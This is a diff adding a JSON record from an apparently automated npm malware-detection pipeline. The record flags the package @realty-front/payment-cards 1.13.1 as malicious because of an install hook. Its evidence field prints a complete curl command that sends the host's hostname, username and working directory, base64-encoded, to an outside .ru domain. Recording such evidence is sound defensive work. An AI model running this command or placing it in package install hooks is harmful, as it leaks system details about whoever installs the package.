@@ -1,0 +1,33 @@
+{
+  "package_name": "@realty-front/payment-cards",
+  "version": "1.13.1",
+  "label": "malicious",
+  "behaviors": [
+    {
+      "category": "suspicious_behavior",
+      "summary": "Suspicious behavior detected in package @realty-front/payment-cards version 1.13.1. Install hook present with payload likely to execute at install time.",
+      "details": "The package contains no JavaScript files and an install hook present. The payload may be remote. Verify the malicious intent from hook commands and structural signals only.",
+      "confidence": 0.72,
+      "evidence_apis": [],
+      "evidence_files": [],
+      "evidence_domains": [],
+      "evidence_commands": [
+        "curl -H \"Package:@realty-front/payment-cards\" -H \"Version:1.13.1\" -H \"Hostname:$(hostname|base64)\" -H \"Whoami:$(whoami|base64)\" -H \"Pwd:$(pwd|base64)\" -d\"meow!securitytest\" http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru"
+      ],
+      "evidence_env_vars": []
+    }
+  ],
+  "risk_vector": [
+    "suspicious_behavior"
+  ],
+  "analyst_note": "",
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "semantic_v2.0",
+    "routing": "review",
+    "structural_risk_score": 0.336,
+    "confirmed_signals_count": 1,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-26T21:54:59.573045"
+}
